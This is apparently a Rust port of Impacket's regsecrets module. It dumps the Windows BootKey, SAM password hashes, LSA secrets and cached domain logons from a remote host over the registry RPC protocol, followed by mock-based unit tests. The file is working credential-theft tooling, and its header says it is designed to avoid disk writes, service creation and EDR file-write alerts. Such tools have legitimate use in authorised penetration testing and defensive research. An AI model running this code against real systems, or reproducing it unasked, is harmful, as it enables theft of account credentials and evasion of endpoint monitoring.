//! `regsecrets`: Remote registry-based secrets extraction via `[MS-RRP]` without disk writes.
//!
//! Equivalent to Python Impacket v0.13's `regsecrets.py` — reads individual registry values
//! directly over the RRP wire protocol instead of saving hive files to disk. Avoids:
//! - Writing any files to disk on the target
//! - Creating any services
//! - Triggering file-write EDR alerts
//!
//! Three extraction stages:
//! 1. **BootKey**: Read class names from `SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}`
//! 2. **SAM hashes**: Read `SAM\Domains\Account\F` + per-user `V` values
//! 3. **LSA secrets**: Read `SECURITY\Policy\PolEKList` + `Secrets\*\CurrVal` + `Cache\NL$*`

use crate::lsa::{decrypt_aes, sha256_repeated, md5_repeated, LsaCachedLogon, LsaSecretItem};
use crate::{
    compute_bootkey_from_lsa_classes, hashed_bootkey_from_f, parse_sam_user_v,
    DecryptedSamAccount,
};
use impacket_core::{decode_utf16le, encode_hex, CoreError, FileTime};
use impacket_crypto::{hmac_md5, Rc4};
use impacket_dcerpc::RpcTransport;
use impacket_msrpc::rrp::{RrpClient, RegHandle, KEY_READ, MAXIMUM_ALLOWED};

// ---- helpers ----------------------------------------------------------------

fn rd_u16_le(data: &[u8], offset: usize) -> Option<u16> {
    data.get(offset..offset + 2)
        .map(|b| u16::from_le_bytes([b[0], b[1]]))
}

fn rd_u32_le(data: &[u8], offset: usize) -> Option<u32> {
    data.get(offset..offset + 4)
        .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

fn rd_u64_le(data: &[u8], offset: usize) -> Option<u64> {
    data.get(offset..offset + 8)
        .map(|b| u64::from_le_bytes([b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7]]))
}

/// Opens a subkey relative to `parent`, reads a value, then closes the subkey handle.
fn read_value_at<T: RpcTransport>(
    rrp: &mut RrpClient<T>,
    parent: &RegHandle,
    subkey_path: &str,
    value_name: &str,
) -> Result<(u32, Vec<u8>), CoreError> {
    let hk = rrp.open_key(parent, subkey_path, KEY_READ)?;
    let result = rrp.query_value_large(&hk, value_name, 65536);
    let _ = rrp.close_key(&hk);
    result
}

/// Opens a subkey, reads the class name via `query_info_key`, then closes it.
fn read_class_name<T: RpcTransport>(
    rrp: &mut RrpClient<T>,
    parent: &RegHandle,
    subkey: &str,
) -> Result<String, CoreError> {
    let hk = rrp.open_key(parent, subkey, KEY_READ)?;
    let info = rrp.query_info_key(&hk);
    let _ = rrp.close_key(&hk);
    Ok(info?.class_name)
}

// ---- BootKey ----------------------------------------------------------------

/// Extracts the 16-byte BootKey from the remote SYSTEM registry via `[MS-RRP]` without disk writes.
///
/// Opens `HKLM\SYSTEM`, reads `Select\Current` to determine the active ControlSet, then reads
/// the class names from `Control\Lsa\{JD, Skew1, GBG, Data}` and applies the standard permutation.
pub fn extract_bootkey_remote<T: RpcTransport>(
    rrp: &mut RrpClient<T>,
) -> Result<[u8; 16], CoreError> {
    let hklm = rrp.open_local_machine(MAXIMUM_ALLOWED)?;

    // Read Select\Current to find active ControlSet
    let (_, current_raw) = read_value_at(rrp, &hklm, "SYSTEM\\Select", "Current")?;
    if current_raw.len() < 4 {
        let _ = rrp.close_key(&hklm);
        return Err(CoreError::ProtocolError(
            "SYSTEM\\Select\\Current not a DWORD".into(),
        ));
    }
    let cs_num = u32::from_le_bytes([current_raw[0], current_raw[1], current_raw[2], current_raw[3]]);
    let lsa_base = format!("SYSTEM\\ControlSet{:03}\\Control\\Lsa", cs_num);

    // Open the Lsa key to read class names of JD, Skew1, GBG, Data subkeys
    let lsa_handle = rrp.open_key(&hklm, &lsa_base, KEY_READ)?;

    let jd = read_class_name(rrp, &lsa_handle, "JD")?;
    let skew1 = read_class_name(rrp, &lsa_handle, "Skew1")?;
    let gbg = read_class_name(rrp, &lsa_handle, "GBG")?;
    let data = read_class_name(rrp, &lsa_handle, "Data")?;

    let _ = rrp.close_key(&lsa_handle);
    let _ = rrp.close_key(&hklm);

    compute_bootkey_from_lsa_classes(&jd, &skew1, &gbg, &data)
}

// ---- SAM hashes -------------------------------------------------------------

/// Extracts SAM account hashes from the remote SAM registry via `[MS-RRP]` without disk writes.
///
/// Opens `HKLM\SAM\SAM\Domains\Account`, reads the `F` value for the HashedBootKey, then
/// enumerates `Users` subkeys and reads each user's `V` value.
pub fn extract_sam_hashes_remote<T: RpcTransport>(
    rrp: &mut RrpClient<T>,
    bootkey: &[u8; 16],
) -> Result<Vec<DecryptedSamAccount>, CoreError> {
    let hklm = rrp.open_local_machine(MAXIMUM_ALLOWED)?;

    // Read Account\F for HashedBootKey
    let account = rrp.open_key(&hklm, "SAM\\SAM\\Domains\\Account", KEY_READ)?;
    let (_, f_data) = rrp.query_value_large(&account, "F", 65536)?;
    let hbootkey = hashed_bootkey_from_f(&f_data, bootkey)?;

    // Enumerate Users subkeys
    let users = rrp.open_key(&account, "Users", KEY_READ)?;
    let subkeys = rrp.enum_all_subkeys(&users)?;

    let mut accounts = Vec::new();
    for name in &subkeys {
        if name.eq_ignore_ascii_case("Names") {
            continue;
        }
        let rid = match u32::from_str_radix(name, 16) {
            Ok(r) => r,
            Err(_) => continue,
        };
        let user_key = match rrp.open_key(&users, name, KEY_READ) {
            Ok(h) => h,
            Err(_) => continue,
        };
        let v_result = rrp.query_value_large(&user_key, "V", 65536);
        let _ = rrp.close_key(&user_key);
        if let Ok((_, v_data)) = v_result {
            if let Ok(acct) = parse_sam_user_v(&v_data, rid, &hbootkey) {
                accounts.push(acct);
            }
        }
    }

    let _ = rrp.close_key(&users);
    let _ = rrp.close_key(&account);
    let _ = rrp.close_key(&hklm);

    Ok(accounts)
}

// ---- LSA secrets & cached logons --------------------------------------------

/// Decrypts an LSA secret blob (Vista+ AES or legacy RC4) given the LSA key.
fn decrypt_lsa_secret(
    data: &[u8],
    lsa_key: &[u8],
    is_vista: bool,
) -> Result<Vec<u8>, CoreError> {
    if is_vista {
        if data.len() < 28 + 32 {
            return Err(CoreError::ProtocolError("LSA secret blob too short".into()));
        }
        let enc_data = &data[28..];
        let salt = &enc_data[0..32];
        let ciphertext = &enc_data[32..];
        let tmp_key = sha256_repeated(lsa_key, salt, 1000);
        decrypt_aes(&tmp_key, ciphertext, None)
    } else {
        // Legacy XP: data is already plaintext or needs RC4
        Ok(data.to_vec())
    }
}

/// Recovers the LSA secret key from `SECURITY\Policy\PolEKList` (Vista+) or
/// `Policy\PolSecretEncryptionKey` (legacy XP/2003).
fn recover_lsa_key<T: RpcTransport>(
    rrp: &mut RrpClient<T>,
    security: &RegHandle,
    bootkey: &[u8; 16],
) -> Result<(Vec<u8>, bool), CoreError> {
    // Try modern PolEKList first
    if let Ok(pol_ek) = rrp.open_key(security, "Policy\\PolEKList", KEY_READ) {
        let result = rrp.query_value_large(&pol_ek, "", 65536)
            .or_else(|_| rrp.query_value_large(&pol_ek, "default", 65536));
        let _ = rrp.close_key(&pol_ek);
        if let Ok((_, val_data)) = result {
            if val_data.len() >= 60 {
                let enc_data = &val_data[28..];
                if enc_data.len() >= 32 {
                    let salt = &enc_data[0..32];
                    let ciphertext = &enc_data[32..];
                    let tmp_key = sha256_repeated(bootkey, salt, 1000);
                    let plain = decrypt_aes(&tmp_key, ciphertext, None)?;
                    if plain.len() >= 16 + 52 + 32 {
                        let lsa_key = plain[16 + 52..16 + 52 + 32].to_vec();
                        return Ok((lsa_key, true));
                    }
                }
            }
        }
    }

    // Fall back to legacy PolSecretEncryptionKey
    if let Ok(pol_sec) = rrp.open_key(security, "Policy\\PolSecretEncryptionKey", KEY_READ) {
        let result = rrp.query_value_large(&pol_sec, "", 65536)
            .or_else(|_| rrp.query_value_large(&pol_sec, "default", 65536));
        let _ = rrp.close_key(&pol_sec);
        if let Ok((_, val_data)) = result {
            if val_data.len() >= 76 {
                let salt = &val_data[60..76];
                let tmp_key = md5_repeated(bootkey, salt, 1000);
                let mut rc4 = Rc4::new(&tmp_key);
                let mut plain = val_data[12..60].to_vec();
                rc4.apply_keystream(&mut plain);
                let lsa_key = plain[0x10..0x20].to_vec();
                return Ok((lsa_key, false));
            }
        }
    }

    Err(CoreError::ProtocolError(
        "Could not recover LSA key from remote SECURITY registry".into(),
    ))
}

/// Extracts LSA secrets and cached domain logon credentials from the remote SECURITY registry
/// via `[MS-RRP]` without disk writes.
///
/// Returns `(secrets, cached_logons)`.
pub fn extract_lsa_secrets_remote<T: RpcTransport>(
    rrp: &mut RrpClient<T>,
    bootkey: &[u8; 16],
) -> Result<(Vec<LsaSecretItem>, Vec<LsaCachedLogon>), CoreError> {
    let hklm = rrp.open_local_machine(MAXIMUM_ALLOWED)?;
    let security = rrp.open_key(&hklm, "SECURITY", KEY_READ)?;

    let (lsa_key, is_vista) = recover_lsa_key(rrp, &security, bootkey)?;

    // ---- Decrypt NL$KM for cached logon decryption ----
    let nlkm_key = if let Ok(nlkm_handle) =
        rrp.open_key(&security, "Policy\\Secrets\\NL$KM\\CurrVal", KEY_READ)
    {
        let result = rrp.query_value_large(&nlkm_handle, "", 65536)
            .or_else(|_| rrp.query_value_large(&nlkm_handle, "default", 65536));
        let _ = rrp.close_key(&nlkm_handle);
        match result {
            Ok((_, data)) => decrypt_lsa_secret(&data, &lsa_key, is_vista).ok(),
            Err(_) => None,
        }
    } else {
        None
    };

    // ---- Extract cached domain logons from Cache\NL$* ----
    let mut cached_logons = Vec::new();
    if let Some(ref nlkm) = nlkm_key {
        if let Ok(cache_handle) = rrp.open_key(&security, "Cache", KEY_READ) {
            // Read iteration count
            let iteration_count = match rrp.query_value_large(&cache_handle, "NL$IterationCount", 16) {
                Ok((_, ic_data)) if ic_data.len() >= 4 => {
                    let raw = u32::from_le_bytes([ic_data[0], ic_data[1], ic_data[2], ic_data[3]]);
                    if raw > 10240 { raw & 0xFFFF_FC00 } else { raw * 1024 }
                }
                _ => 10240,
            };

            // Enumerate all values in Cache
            if let Ok(vals) = rrp.enum_all_values(&cache_handle) {
                for (name, _vtype, data) in &vals {
                    if !name.starts_with("NL$")
                        || name.eq_ignore_ascii_case("NL$Control")
                        || name.eq_ignore_ascii_case("NL$IterationCount")
                    {
                        continue;
                    }
                    if let Some(logon) =
                        parse_cached_logon(data, nlkm, is_vista, iteration_count)
                    {
                        cached_logons.push(logon);
                    }
                }
            }
            let _ = rrp.close_key(&cache_handle);
        }
    }

    // ---- Extract all LSA secrets from Policy\Secrets\*\CurrVal ----
    let mut secrets = Vec::new();
    if let Ok(secrets_handle) = rrp.open_key(&security, "Policy\\Secrets", KEY_READ) {
        let secret_names = rrp.enum_all_subkeys(&secrets_handle).unwrap_or_default();
        for secret_name in &secret_names {
            let curr_path = format!("{}\\CurrVal", secret_name);
            if let Ok(curr_handle) = rrp.open_key(&secrets_handle, &curr_path, KEY_READ) {
                let result = rrp.query_value_large(&curr_handle, "", 65536)
                    .or_else(|_| rrp.query_value_large(&curr_handle, "default", 65536));
                let _ = rrp.close_key(&curr_handle);
                if let Ok((_, val_data)) = result {
                    if val_data.is_empty() || val_data.starts_with(b"\x00\x00") {
                        continue;
                    }
                    let secret_raw = if is_vista {
                        match decrypt_lsa_secret(&val_data, &lsa_key, true) {
                            Ok(plain) => {
                                if plain.len() >= 16 {
                                    let len =
                                        rd_u32_le(&plain, 0).unwrap_or(0) as usize;
                                    if plain.len() >= 16 + len {
                                        plain[16..16 + len].to_vec()
                                    } else {
                                        plain[16..].to_vec()
                                    }
                                } else {
                                    continue;
                                }
                            }
                            Err(_) => continue,
                        }
                    } else {
                        val_data
                    };
                    let secret_text = decode_utf16le(&secret_raw).ok();
                    secrets.push(LsaSecretItem {
                        name: secret_name.clone(),
                        secret_raw,
                        secret_text,
                    });
                }
            }
        }
        let _ = rrp.close_key(&secrets_handle);
    }

    let _ = rrp.close_key(&security);
    let _ = rrp.close_key(&hklm);

    Ok((secrets, cached_logons))
}

/// Parses a single cached domain logon entry from `Cache\NL$<n>` data.
fn parse_cached_logon(
    data: &[u8],
    nlkm_key: &[u8],
    is_vista: bool,
    iteration_count: u32,
) -> Option<LsaCachedLogon> {
    if data.len() < 96 {
        return None;
    }
    let user_len = rd_u16_le(data, 0)? as usize;
    let dom_len = rd_u16_le(data, 2)? as usize;
    let last_write = rd_u64_le(data, 24).unwrap_or(0);
    let flags = rd_u32_le(data, 40).unwrap_or(0);
    let dns_dom_len = rd_u16_le(data, 52)? as usize;

    let iv: [u8; 16] = data.get(64..80)?.try_into().ok()?;
    if iv == [0u8; 16] || (flags & 1) == 0 {
        return None;
    }

    let encrypted_data = data.get(96..)?;
    if encrypted_data.is_empty() {
        return None;
    }

    let plain = if is_vista {
        if nlkm_key.len() < 32 {
            return None;
        }
        let iv_ref: &[u8; 16] = &iv;
        decrypt_aes(&nlkm_key[16..32], encrypted_data, Some(iv_ref)).ok()?
    } else {
        let hmac = hmac_md5(nlkm_key, &iv);
        let mut rc4 = Rc4::new(&hmac);
        let mut p = encrypted_data.to_vec();
        rc4.apply_keystream(&mut p);
        p
    };

    if plain.len() < 0x48 {
        return None;
    }

    let enc_hash = encode_hex(&plain[0..16]);
    let rest = &plain[0x48..];
    if rest.len() < user_len {
        return None;
    }

    let username = decode_utf16le(&rest[..user_len]).unwrap_or_default();
    let pad_user = (user_len + 3) & !3;
    let pad_dom = (dom_len + 3) & !3;
    let dns_offset = pad_user + pad_dom;

    let domain = if rest.len() >= dns_offset + dns_dom_len {
        decode_utf16le(&rest[dns_offset..dns_offset + dns_dom_len]).unwrap_or_default()
    } else {
        String::new()
    };

    Some(LsaCachedLogon {
        domain,
        username,
        hash_hex: enc_hash,
        iteration_count,
        last_write_unix: FileTime::from_raw(last_write).to_unix_secs(),
    })
}

// ---- Full dump --------------------------------------------------------------

/// Complete report returned by `regsecrets_dump`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RegSecretsDumpReport {
    pub bootkey: [u8; 16],
    pub sam_accounts: Vec<DecryptedSamAccount>,
    pub lsa_secrets: Vec<LsaSecretItem>,
    pub cached_logons: Vec<LsaCachedLogon>,
}

/// Complete regsecrets extraction: BootKey + SAM + LSA, all via `[MS-RRP]` without disk writes.
pub fn regsecrets_dump<T: RpcTransport>(
    rrp: &mut RrpClient<T>,
) -> Result<RegSecretsDumpReport, CoreError> {
    let bootkey = extract_bootkey_remote(rrp)?;
    let sam_accounts = extract_sam_hashes_remote(rrp, &bootkey)?;
    let (lsa_secrets, cached_logons) = extract_lsa_secrets_remote(rrp, &bootkey)
        .unwrap_or_else(|_| (Vec::new(), Vec::new()));

    Ok(RegSecretsDumpReport {
        bootkey,
        sam_accounts,
        lsa_secrets,
        cached_logons,
    })
}

// ---- Tests ------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{
        compute_bootkey_from_lsa_classes, encrypt_hashed_bootkey_rc4, encrypt_sam_hash_rc4,
    };
    use impacket_core::{encode_hex, encode_utf16le, EMPTY_LM_HASH};
    use impacket_dcerpc::{pdu_type, RpcCommonHeader};
    use impacket_msrpc::rrp::{reg_type, REFERENT_BASE};
    use impacket_ndr::{NdrSerialize, NdrWriter};
    use std::collections::VecDeque;

    // --- Mock transport reused from rrp.rs tests ---
    struct MockRrp {
        responses: VecDeque<Vec<u8>>,
    }
    impl MockRrp {
        fn new(stubs: Vec<Vec<u8>>) -> Self {
            let responses = stubs
                .into_iter()
                .map(|stub| {
                    let frag_len = (24 + stub.len()) as u16;
                    let hdr = RpcCommonHeader::new(pdu_type::RPC_RESPONSE, frag_len, 0, 1);
                    let mut w = NdrWriter::with_capacity(frag_len as usize);
                    hdr.ndr_serialize(&mut w);
                    w.write_u32(stub.len() as u32);
                    w.write_u16(0);
                    w.write_u16(0);
                    w.write_bytes(&stub);
                    w.into_bytes()
                })
                .collect();
            Self { responses }
        }
    }
    impl RpcTransport for MockRrp {
        fn transceive(&mut self, _r: &[u8]) -> Result<Vec<u8>, CoreError> {
            self.responses
                .pop_front()
                .ok_or_else(|| CoreError::ProtocolError("no more mock responses".into()))
        }
    }

    // --- Response builders ---

    fn handle_resp(h: [u8; 20]) -> Vec<u8> {
        let mut w = NdrWriter::with_capacity(24);
        w.write_fixed_array(&h);
        w.write_u32(0); // ERROR_SUCCESS
        w.into_bytes()
    }

    fn query_value_resp(val_type: u32, data: &[u8]) -> Vec<u8> {
        let mut resp = Vec::new();
        resp.extend_from_slice(&REFERENT_BASE.to_le_bytes());
        resp.extend_from_slice(&val_type.to_le_bytes());
        resp.extend_from_slice(&(REFERENT_BASE + 4).to_le_bytes());
        resp.extend_from_slice(&(data.len() as u32).to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes());
        resp.extend_from_slice(&(data.len() as u32).to_le_bytes());
        resp.extend_from_slice(data);
        while resp.len() % 4 != 0 {
            resp.push(0);
        }
        resp.extend_from_slice(&(REFERENT_BASE + 8).to_le_bytes());
        resp.extend_from_slice(&(data.len() as u32).to_le_bytes());
        resp.extend_from_slice(&(REFERENT_BASE + 12).to_le_bytes());
        resp.extend_from_slice(&(data.len() as u32).to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes()); // ERROR_SUCCESS
        resp
    }

    fn query_info_key_resp(class_name: &str, max_value_len: u32) -> Vec<u8> {
        let class_utf16 = encode_utf16le(class_name);
        let char_count = class_utf16.len() / 2;

        let mut w = NdrWriter::with_capacity(128);
        // lpClassOut: RRP_UNICODE_STRING
        w.write_u16(class_utf16.len() as u16); // Length
        w.write_u16((class_utf16.len() + 2) as u16); // MaximumLength
        if class_name.is_empty() {
            w.write_u32(REFERENT_BASE); // referent (present but empty)
            // Deferred empty array
            w.write_u32(0); // max_count
            w.write_u32(0); // offset
            w.write_u32(0); // actual_count
        } else {
            w.write_u32(REFERENT_BASE); // referent
            // Deferred conformant+varying array
            w.write_u32((char_count + 1) as u32); // max_count (incl NUL)
            w.write_u32(0); // offset
            w.write_u32((char_count + 1) as u32); // actual_count (incl NUL)
            w.write_bytes(&class_utf16);
            w.write_u16(0); // NUL terminator
            w.align(4);
        }
        // Metadata DWORDs
        w.write_u32(0); // lpcSubKeys
        w.write_u32(0); // lpcbMaxSubKeyLen
        w.write_u32(0); // lpcbMaxClassLen
        w.write_u32(0); // lpcValues
        w.write_u32(0); // lpcbMaxValueNameLen
        w.write_u32(max_value_len); // lpcbMaxValueLen
        w.write_u32(0); // lpcbSecurityDescriptor
        w.write_u64(0); // lpftLastWriteTime
        w.write_u32(0); // ERROR_SUCCESS
        w.into_bytes()
    }

    fn close_resp() -> Vec<u8> {
        // BaseRegCloseKey echoes the handle + error; for mock just the error
        let mut w = NdrWriter::with_capacity(4);
        w.write_u32(0);
        w.into_bytes()
    }

    fn enum_key_resp(name: Option<&str>) -> Vec<u8> {
        let mut w = NdrWriter::with_capacity(64);
        match name {
            Some(n) => {
                let utf16 = encode_utf16le(n);
                let char_count = utf16.len() / 2;
                w.write_u16(utf16.len() as u16); // Length
                w.write_u16((utf16.len() + 2) as u16); // MaximumLength
                w.write_u32(REFERENT_BASE); // Buffer referent
                w.write_u32(0); // lpClassIn = NULL
                w.write_u32(0); // lpftLastWriteTime = NULL
                // Deferred string
                w.write_u32((char_count + 1) as u32); // max_count
                w.write_u32(0); // offset
                w.write_u32((char_count + 1) as u32); // actual_count
                w.write_bytes(&utf16);
                w.write_u16(0); // NUL
                w.align(4);
                w.write_u32(0); // ERROR_SUCCESS
            }
            None => {
                w.write_u16(0);
                w.write_u16(512);
                w.write_u32(REFERENT_BASE);
                w.write_u32(0);
                w.write_u32(0);
                w.write_u32(256);
                w.write_u32(0);
                w.write_u32(0);
                w.write_u32(259); // ERROR_NO_MORE_ITEMS
            }
        }
        w.into_bytes()
    }

    /// Builds a minimal V record with a username and NT hash (RC4 rev1).
    fn build_v_record(username: &str, rid: u32, hbootkey: &[u8; 16], nt_hash: &[u8; 16]) -> Vec<u8> {
        let name_bytes: Vec<u8> = username.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let nt_enc = encrypt_sam_hash_rc4(rid, hbootkey, nt_hash, true);

        let base = 0xCCusize;
        let mut v = vec![0u8; base + name_bytes.len() + 20 + 16]; // enough space
        // Name at data rel 0
        v[base..base + name_bytes.len()].copy_from_slice(&name_bytes);
        v[0x0C..0x10].copy_from_slice(&0u32.to_le_bytes());
        v[0x10..0x14].copy_from_slice(&(name_bytes.len() as u32).to_le_bytes());
        // LM: offset/len = 0 (no LM hash)
        v[0x9C..0xA0].copy_from_slice(&0u32.to_le_bytes());
        v[0xA0..0xA4].copy_from_slice(&0u32.to_le_bytes());
        // NT hash block at data rel = name_bytes.len()
        let nt_rel = name_bytes.len();
        let block_abs = base + nt_rel;
        v[block_abs + 2] = 1; // Revision = 1 (RC4)
        v[block_abs + 4..block_abs + 20].copy_from_slice(&nt_enc);
        v[0xA8..0xAC].copy_from_slice(&(nt_rel as u32).to_le_bytes());
        v[0xAC..0xB0].copy_from_slice(&20u32.to_le_bytes());
        v
    }

    #[test]
    fn test_extract_bootkey_remote() {
        // The class names that produce a known bootkey
        let jd_class = "4a6f7931";
        let skew1_class = "536b6577";
        let gbg_class = "47424732";
        let data_class = "44617461";

        let expected_bootkey =
            compute_bootkey_from_lsa_classes(jd_class, skew1_class, gbg_class, data_class).unwrap();

        let hklm_handle = [0x01u8; 20];
        let select_handle = [0x02u8; 20];
        let lsa_handle = [0x03u8; 20];
        let jd_handle = [0x04u8; 20];
        let skew1_handle = [0x05u8; 20];
        let gbg_handle = [0x06u8; 20];
        let data_handle = [0x07u8; 20];

        let stubs = vec![
            // 1. OpenLocalMachine
            handle_resp(hklm_handle),
            // 2. OpenKey "SYSTEM\Select"
            handle_resp(select_handle),
            // 3. QueryInfoKey (for query_value_large on Select)
            query_info_key_resp("", 64),
            // 4. QueryValue "Current" -> DWORD 1
            query_value_resp(reg_type::REG_DWORD, &1u32.to_le_bytes()),
            // 5. CloseKey (select_handle)
            close_resp(),
            // 6. OpenKey "SYSTEM\ControlSet001\Control\Lsa"
            handle_resp(lsa_handle),
            // 7. OpenKey "JD"
            handle_resp(jd_handle),
            // 8. QueryInfoKey -> class "4a6f7931"
            query_info_key_resp(jd_class, 0),
            // 9. CloseKey JD
            close_resp(),
            // 10. OpenKey "Skew1"
            handle_resp(skew1_handle),
            // 11. QueryInfoKey -> class "536b6577"
            query_info_key_resp(skew1_class, 0),
            // 12. CloseKey Skew1
            close_resp(),
            // 13. OpenKey "GBG"
            handle_resp(gbg_handle),
            // 14. QueryInfoKey -> class "47424732"
            query_info_key_resp(gbg_class, 0),
            // 15. CloseKey GBG
            close_resp(),
            // 16. OpenKey "Data"
            handle_resp(data_handle),
            // 17. QueryInfoKey -> class "44617461"
            query_info_key_resp(data_class, 0),
            // 18. CloseKey Data
            close_resp(),
            // 19. CloseKey Lsa
            close_resp(),
            // 20. CloseKey HKLM
            close_resp(),
        ];

        let mock = MockRrp::new(stubs);
        let mut client = RrpClient::new(mock);

        let bootkey = extract_bootkey_remote(&mut client).unwrap();
        assert_eq!(bootkey, expected_bootkey);
    }

    #[test]
    fn test_extract_sam_hashes_remote() {
        let bootkey = [0x42u8; 16];
        let hbootkey: [u8; 16] = [
            0x91, 0x82, 0x73, 0x64, 0x55, 0x46, 0x37, 0x28, 0x19, 0x0a, 0xfb, 0xec, 0xdd, 0xce,
            0xbf, 0xb0,
        ];

        let salt = [0x3Cu8; 16];
        let enc = encrypt_hashed_bootkey_rc4(&bootkey, &salt, &hbootkey);
        let mut f_data = vec![0u8; 0xA8];
        f_data[0x70] = 1; // Revision 1
        f_data[0x78..0x88].copy_from_slice(&salt);
        f_data[0x88..0xA8].copy_from_slice(&enc);

        let admin_nt: [u8; 16] = [
            0x88, 0x46, 0xf7, 0xea, 0xee, 0x8f, 0xb1, 0x17, 0xad, 0x06, 0xbd, 0xd8, 0x30, 0xb7,
            0x58, 0x6c,
        ];
        let v_admin = build_v_record("Administrator", 500, &hbootkey, &admin_nt);

        let hklm_handle = [0x10u8; 20];
        let account_handle = [0x11u8; 20];
        let users_handle = [0x12u8; 20];
        let admin_handle = [0x13u8; 20];

        let stubs = vec![
            // OpenLocalMachine
            handle_resp(hklm_handle),
            // OpenKey "SAM\SAM\Domains\Account"
            handle_resp(account_handle),
            // QueryInfoKey (for query_value_large on Account)
            query_info_key_resp("", f_data.len() as u32),
            // QueryValue "F"
            query_value_resp(reg_type::REG_BINARY, &f_data),
            // OpenKey "Users"
            handle_resp(users_handle),
            // EnumKey 0 -> "000001F4" (RID 500)
            enum_key_resp(Some("000001F4")),
            // EnumKey 1 -> None
            enum_key_resp(None),
            // OpenKey "000001F4"
            handle_resp(admin_handle),
            // QueryInfoKey (for query_value_large on user key)
            query_info_key_resp("", v_admin.len() as u32),
            // QueryValue "V"
            query_value_resp(reg_type::REG_BINARY, &v_admin),
            // CloseKey (admin user)
            close_resp(),
            // CloseKey (Users)
            close_resp(),
            // CloseKey (Account)
            close_resp(),
            // CloseKey (HKLM)
            close_resp(),
        ];

        let mock = MockRrp::new(stubs);
        let mut client = RrpClient::new(mock);

        let accounts = extract_sam_hashes_remote(&mut client, &bootkey).unwrap();
        assert_eq!(accounts.len(), 1);
        assert_eq!(accounts[0].username, "Administrator");
        assert_eq!(accounts[0].rid, 500);
        assert_eq!(accounts[0].hashes.nt, admin_nt);
        assert_eq!(accounts[0].hashes.lm, EMPTY_LM_HASH);
        assert_eq!(
            accounts[0].to_secretsdump_line(),
            "Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::"
        );
    }

    #[test]
    fn test_regsecrets_dump_report_format() {
        let report = RegSecretsDumpReport {
            bootkey: [0x42u8; 16],
            sam_accounts: vec![],
            lsa_secrets: vec![],
            cached_logons: vec![],
        };
        assert_eq!(encode_hex(&report.bootkey), "42424242424242424242424242424242");
        assert!(report.sam_accounts.is_empty());
    }
}
